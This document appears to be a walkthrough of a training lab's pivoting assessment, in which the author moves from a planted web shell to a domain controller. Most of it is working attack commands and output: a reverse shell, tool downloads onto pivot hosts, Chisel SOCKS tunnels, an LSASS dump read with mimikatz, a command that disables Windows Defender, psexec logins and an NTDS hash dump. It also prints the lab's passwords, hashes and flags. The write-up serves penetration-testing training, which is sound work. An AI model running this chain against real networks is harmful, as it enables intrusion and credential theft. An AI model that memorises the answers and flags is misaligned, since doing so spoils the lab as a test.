# Pivoting Assessment

## Labs - Skills Assessment

###

Scenario

A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a `web shell` in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are `below`:

###

Objectives

* Start from external (`Pwnbox or your own VM`) and access the first system via the web shell left in place.
* Use the web shell access to enumerate and pivot to an internal host.
* Continue enumeration and pivoting until you reach the `Inlanefreight Domain Controller` and capture the associated `flag`.
* Use any `data`, `credentials`, `scripts`, or other information within the environment to enable your pivoting attempts.
* Grab `any/all` flags that can be found.

###

Questions

####

1. Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.

Access web shell on `http://10.129.195.1/`

p0wny@shell:…/www/html# ls -la /home/webadmin

total 40

drwxr-xr-x 4 webadmin webadmin 4096 May 18 2022 .

drwxr-xr-x 4 root root 4096 May 6 2022 ..

\-rw------- 1 webadmin webadmin 1262 May 23 2022 .bash\_history

\-rw-r--r-- 1 webadmin webadmin 220 May 6 2022 .bash\_logout

\-rw-r--r-- 1 webadmin webadmin 3771 May 6 2022 .bashrc

drwx------ 2 webadmin webadmin 4096 May 16 2022 .cache

\-rw-r--r-- 1 webadmin webadmin 807 May 6 2022 .profile

drwx--x--x 2 webadmin webadmin 4096 May 16 2022 .ssh

\-rw-r--r-- 1 root root 163 May 16 2022 for-admin-eyes-only

\-rw-r--r-- 1 root root 2622 May 16 2022 id\_rsa

​

p0wny@shell:…/www/html# cat /home/webadmin/for-admin-eyes-only

## note to self,

in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay

with a password of :

Plain Human work!

Found credentials `mlefay:Plain Human work!`

**Answer:** `**webadmin**`

####

2. Submit the credentials found in the user's home directory. (Format: user:password)

Continued from question above:

**Answer:** `**mlefay:Plain Human work!**`

####

3. Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.

Caught a reverse shell using the web shell above with `nc mkfifo` command from [https://www.revshells.com/](https://www.revshells.com/) to enumerate further. Found that the host was dual-homed:

www-data@inlanefreight:/var/www/html$ hostname

inlanefreight.local

www-data@inlanefreight:/var/www/html$ ip a

3: ens192: \<BROADCAST,MULTICAST,UP,LOWER\_UP> mtu 1500 qdisc mq state UP group default qlen 1000

link/ether 00:50:56:b9:1b:27 brd ff:ff:ff:ff:ff:ff

inet 172.16.5.15/16 brd 172.16.255.255 scope global ens192

valid\_lft forever preferred\_lft forever

inet6 fe80::250:56ff:feb9:1b27/64 scope link

valid\_lft forever preferred\_lft forever

www-data@inlanefreight:/var/www/html$ for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

64 bytes from 172.16.5.15: icmp\_seq=1 ttl=64 time=0.021 ms

64 bytes from 172.16.5.35: icmp\_seq=1 ttl=128 time=0.455 ms

**Answer:** `**172.16.5.35**`

####

4. Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.



Setup pivot from Attack host through inlanefreight.local (pivot host) to `**172.16.5.35**`:

**Step 1:** Start Chisel server (listener) on attack host:

┌──(kali㉿kali)-\[\~]

└─$ chisel server --reverse -v -p 1111 --socks5

Step 2: Transfer Chisel to pivot host and connect to the server (listener):

www-data@inlanefreight:/var/www/html$ wget http://10.10.14.2:8000/chisel

www-data@inlanefreight:/var/www/html$ chmod +x chisel

www-data@inlanefreight:/var/www/html$ ./chisel client -v 10.10.14.2:1111 R:socks

2023/03/05 18:56:05 client: Handshaking...

2023/03/05 18:56:05 client: Sending config

2023/03/05 18:56:05 client: tun: SSH connected

2023/03/05 18:56:11 client: tun: conn#1: Open \[1/1]

2023/03/05 18:56:24 client: tun: conn#2: Open \[2/2]

Step 3: Add entry to proxychains configuration file - `/etc/proxychains.conf`

socks5 127.0.0.1 1080

Step 4: Use proxychains to enumerate and access `**172.16.5.35**`:

┌──(kali㉿kali)-\[\~]

└─$ proxychains nmap 172.16.5.35 -F -T4

Nmap scan report for 172.16.5.35

Host is up (0.088s latency).

Not shown: 95 closed tcp ports (conn-refused)

PORT STATE SERVICE

22/tcp open ssh

135/tcp open msrpc

139/tcp open netbios-ssn

445/tcp open microsoft-ds

3389/tcp open ms-wbt-server

​

Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds



Access target host `**172.16.5.35**` **using SSH or RDP with credentials above:**

┌──(kali㉿kali)-\[\~]

└─$ proxychains ssh mlefay@172.16.5.35

​

┌──(kali㉿kali)-\[\~]

└─$ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:linux,/home/kali/Transfer

C:\Users\mlefay>hostname

PIVOT-SRV01

C:\Users\mlefay>type C:\Flag.txt

S1ngl3-Piv07-3@sy-Day

**Answer:** `**S1ngl3-Piv07-3@sy-Day**`

####

5. In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?

Dump LSASS:

C:\Users\mlefay>powershell

Windows PowerShell

Copyright (C) Microsoft Corporation. All rights reserved.

​

PS C:\Users\mlefay> Get-Process lsass

​

Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName

***

1253 29 6728 17352 1.52 668 0 lsass

​

PS C:\Users\mlefay> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 668 C:\lsass.dmp full

PS C:\Users\mlefay> dir C:\\

​

Directory: C:\\

​

Mode LastWriteTime Length Name

***

d----- 2/25/2022 10:20 AM PerfLogs

d-r--- 5/6/2022 2:30 AM Program Files

d----- 5/6/2022 2:28 AM Program Files (x86)

d-r--- 5/17/2022 11:14 AM Users

d----- 5/17/2022 11:10 AM Windows

\-a---- 5/17/2022 8:41 AM 21 Flag.txt

\-a---- 3/5/2023 4:54 PM 46202253 lsass.dmp

​

Transfer Mimikatz to target and extract credentials (easiest way to transfer files is through RDP, but method shown below were used for practice):

PS C:\Users\mlefay> (New-Object Net.WebClient).DownloadFile('http://172.16.5.15:8000/mimikatz.exe','mimikatz.exe')

PS C:\Users\mlefay> ./mimikatz.exe

​

.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08

.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)

### / \ ## /\*\*\* Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )

### \ / ## > https://blog.gentilkiwi.com/mimikatz

'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )

'#####' > https://pingcastle.com / https://mysmartlogon.com \*\*\*/

​

mimikatz # sekurlsa::minidump C:\lsass.dmp

Switch to MINIDUMP : 'C:\lsass.dmp'

​

mimikatz # sekurlsa::logonPasswords

Opening : 'C:\lsass.dmp' file for minidump...

​

Authentication Id : 0 ; 160212 (00000000:000271d4)

Session : Service from 0

User Name : vfrank

Domain : INLANEFREIGHT

Logon Server : ACADEMY-PIVOT-D

Logon Time : 3/5/2023 4:19:44 PM

SID : S-1-5-21-3858284412-1730064152-742000644-1103

msv :

\[00000003] Primary

* Username : vfrank
* Domain : INLANEFREIGHT
* NTLM : 2e16a00be74fa0bf862b4256d0347e83
* SHA1 : b055c7614a5520ea0fc1184ac02c88096e447e0b
* DPAPI : 97ead6d940822b2c57b18885ffcc5fb4

tspkg :

wdigest :

* Username : vfrank
* Domain : INLANEFREIGHT
* Password : (null)

kerberos :

* Username : vfrank
* Domain : INLANEFREIGHT.LOCAL
* Password : Imply wet Unmasked!

ssp :

credman :

Found credentials `vfrank:Imply wet Unmasked!`

**Answer:** `**vfrank**`

####

6. For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.



Network discovery (found that the host was dual-homed):

PS C:\Users\mlefay> hostname

PIVOT-SRV01

PS C:\Users\mlefay> ipconfig

​

Windows IP Configuration

​

Ethernet adapter Ethernet0:

​

Connection-specific DNS Suffix . :

Link-local IPv6 Address . . . . . : fe80::8d1e:9c54:57d:2b26%4

IPv4 Address. . . . . . . . . . . : 172.16.5.35

Subnet Mask . . . . . . . . . . . : 255.255.0.0

Default Gateway . . . . . . . . . : 172.16.5.1

​

Ethernet adapter Ethernet1 2:

​

Connection-specific DNS Suffix . :

Link-local IPv6 Address . . . . . : fe80::9826:54b4:d5b6:249f%5

IPv4 Address. . . . . . . . . . . : 172.16.6.35

Subnet Mask . . . . . . . . . . . : 255.255.0.0

Default Gateway . . . . . . . . . :



Host discovery (CMD):

mlefay@PIVOT-SRV01 C:\Users\mlefay>for /L %i in (1 1 254) do @ping 172.16.6.%i -n 2 -w 100 > nul && echo 172.16.6.%i is up.

172.16.6.25 is up.

172.16.6.35 is up.



Setup pivot from Attack host through inlanefreight.local (pivot host 1) and PIVOT-SRV01 (pivot host 2) to `**172.16.6.25**`:

**Step 1:** Start Chisel server (listener) on pivot host 1

www-data@inlanefreight:/var/www/html$ ./chisel server --reverse -v -p 2222 --socks5

Step 2: Transfer Chisel to pivot host 2 and connect to the server (listener):

PS C:\Users\mlefay> (New-Object Net.WebClient).DownloadFile('http://172.16.5.15:8080/chisel.exe','chisel.exe')

PS C:\Users\mlefay> ./chisel.exe client 172.16.5.15:2222 R:2080:socks

Step 3: Add entry to proxychains configuration file - `/etc/proxychains.conf`

socks5 127.0.0.1 2080

Step 4: Use proxychains to enumerate and access `**172.16.6.25**`:

┌──(kali㉿kali)-\[\~]

└─$ proxychains nmap 172.16.6.25 -F -T4

Nmap scan report for 172.16.6.25

Host is up (1.2s latency).

Not shown: 96 closed tcp ports (conn-refused)

PORT STATE SERVICE

135/tcp open msrpc

139/tcp open netbios-ssn

445/tcp open microsoft-ds

3389/tcp open ms-wbt-server

​

Nmap done: 1 IP address (1 host up) scanned in 129.59 seconds



Access target host `**172.16.6.25**` **using Impacket-PsExec or RDP with creds found earlier:**

┌──(kali㉿kali)-\[\~]

└─$ proxychains impacket-psexec vfrank:'Imply wet Unmasked!'@172.16.6.25

​

┌──(kali㉿kali)-\[\~]

└─$ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:linux,/home/kali/Transfer

C:\Windows\system32> dir C:\\

Volume in drive C has no label.

Volume Serial Number is C41A-F2ED

​

Directory of C:\\

​

05/17/2022 11:38 AM 23 Flag.txt

12/14/2020 07:22 PM

PerfLogs

04/27/2022 06:19 AM

Program Files

04/27/2022 06:18 AM

Program Files (x86)

05/17/2022 08:15 AM

Users

03/05/2023 04:33 PM

Windows

1 File(s) 23 bytes

5 Dir(s) 12,736,028,672 bytes free

​

C:\Windows\system32> type C:\Flag.txt

N3tw0rk-H0pp1ng-f0R-FuN

**Answer:** `**N3tw0rk-H0pp1ng-f0R-FuN**`

####

7. Submit the contents of C:\Flag.txt located on the Domain Controller.



Network discovery (found that the host was dual-homed):

C:\Windows\system32> hostname

PIVOTWIN10

​

C:\Windows\system32> ipconfig

Windows IP Configuration

​

Ethernet adapter Ethernet0 2:

​

Connection-specific DNS Suffix . :

Link-local IPv6 Address . . . . . : fe80::bd1e:36da:b01:cb31%9

IPv4 Address. . . . . . . . . . . : 172.16.6.25

Subnet Mask . . . . . . . . . . . : 255.255.0.0

Default Gateway . . . . . . . . . : 172.16.6.1

​

Ethernet adapter Ethernet1 2:

​

Connection-specific DNS Suffix . :

Link-local IPv6 Address . . . . . : fe80::4d9f:7cf6:68a0:4efc%4

IPv4 Address. . . . . . . . . . . : 172.16.10.25

Subnet Mask . . . . . . . . . . . : 255.255.0.0

Default Gateway . . . . . . . . . :



Host discovery (CMD):

C:\Windows\system32> for /L %i in (1 1 254) do @ping 172.16.10.%i -n 2 -w 100 > nul && echo 172.16.10.%i is up.

172.16.10.5 is up.

172.16.10.25 is up.



Setup pivot from Attack host through inlanefreight.local (pivot host 1) and PIVOT-SRV01 (pivot host 2) and PIVOTWIN10 (pivot host 3) to `**172.16.10.5**`:

**Step 1:** Start Chisel server (listener) on pivot host 2

PS C:\Users\mlefay\Desktop> .\chisel.exe server --reverse -v -p 3333 --socks5

Step 2: Transfer Chisel to pivot host 3 and connect to the server (listener):

(Disable Windows Defender using PsExec if unable to transfer tools: `Set-MpPreference -DisableRealtimeMonitoring $true`

PS C:\Users\vfrank\Desktop> .\chisel.exe client 172.16.6.35:3333 R:3080:socks

Step 3: Add entry to proxychains configuration file - `/etc/proxychains.conf`

socks5 127.0.0.1 3080

Step 4: Use proxychains to enumerate and access `**172.16.10.5**`:

┌──(kali㉿kali)-\[\~]

└─$ proxychains nmap 172.16.10.5 -F -T4

Nmap scan report for 172.16.10.5

Host is up (2.3s latency).

Not shown: 94 closed tcp ports (conn-refused)

PORT STATE SERVICE

53/tcp open domain

88/tcp open kerberos-sec

135/tcp open msrpc

139/tcp open netbios-ssn

389/tcp open ldap

445/tcp open microsoft-ds

​

Nmap done: 1 IP address (1 host up) scanned in 218.95 seconds



Access target host `**172.16.6.25**` **using Impacket-PsExec:**

┌──(kali㉿kali)-\[\~]

└─$ proxychains impacket-psexec vfrank:'Imply wet Unmasked!'@172.16.10.5

Microsoft Windows \[Version 10.0.17763.107]

(c) 2018 Microsoft Corporation. All rights reserved.

​

C:\Windows\system32> hostname

ACADEMY-PIVOT-DC01

​

C:\Windows\system32> whoami

nt authority\system

​

C:\Windows\system32> dir C:\\

Volume in drive C has no label.

Volume Serial Number is DA7F-3F25

​

Directory of C:\\

​

05/18/2022 12:33 PM 20 Flag.txt.txt

09/14/2018 11:12 PM

PerfLogs

12/14/2020 06:43 PM

Program Files

09/14/2018 11:21 PM

Program Files (x86)

05/03/2022 09:06 AM

Users

03/05/2023 05:04 PM

Windows

1 File(s) 20 bytes

5 Dir(s) 33,673,859,072 bytes free

​

C:\Windows\system32> type C:\Flag.txt.txt

3nd-0xf-Th3-R@inbow!

**Answer:** `**3nd-0xf-Th3-R@inbow!**`



**Extra:**

┌──(kali㉿kali)-\[\~/Transfer]

└─$ proxychains crackmapexec smb 172.16.10.5 -u vfrank -p 'Imply wet Unmasked!' --ntds

SMB 172.16.10.5 445 ACADEMY-PIVOT-D \[\*] Windows 10.0 Build 17763 x64 (name:ACADEMY-PIVOT-D) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)

SMB 172.16.10.5 445 ACADEMY-PIVOT-D \[+] INLANEFREIGHT.LOCAL\vfrank:Imply wet Unmasked! (Pwn3d!)

SMB 172.16.10.5 445 ACADEMY-PIVOT-D \[+] Dumping the NTDS, this could take a while so go grab a redbull...

SMB 172.16.10.5 445 ACADEMY-PIVOT-D Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::

SMB 172.16.10.5 445 ACADEMY-PIVOT-D Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

SMB 172.16.10.5 445 ACADEMY-PIVOT-D krbtgt:502:aad3b435b51404eeaad3b435b51404ee:29f2d55cc10d46e0fbe05f584670498e:::

SMB 172.16.10.5 445 ACADEMY-PIVOT-D vfrank:1103:aad3b435b51404eeaad3b435b51404ee:2e16a00be74fa0bf862b4256d0347e83:::

SMB 172.16.10.5 445 ACADEMY-PIVOT-D cdrake:1104:aad3b435b51404eeaad3b435b51404ee:30b2dc708d4030aff8c0f7344f5f28ea:::

SMB 172.16.10.5 445 ACADEMY-PIVOT-D The-Watcher:1105:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::

SMB 172.16.10.5 445 ACADEMY-PIVOT-D ACADEMY-PIVOT-D$:1000:aad3b435b51404eeaad3b435b51404ee:e4acb285f4d5cfe3577bf79f74ff945e:::

SMB 172.16.10.5 445 ACADEMY-PIVOT-D PIVOT-WIN10$:1106:aad3b435b51404eeaad3b435b51404ee:e231a2e5a73909b38d294a36d688df04:::

SMB 172.16.10.5 445 ACADEMY-PIVOT-D PIVOT-SRV01$:1107:aad3b435b51404eeaad3b435b51404ee:21ce18b1a025d4b0b01c0e716e99d476:::

SMB 172.16.10.5 445 ACADEMY-PIVOT-D PIVOTWIN10$:1108:aad3b435b51404eeaad3b435b51404ee:270257c51e2d5a6ce73e968306b87eb4:::

SMB 172.16.10.5 445 ACADEMY-PIVOT-D \[+] Dumped 10 NTDS hashes to /home/ka
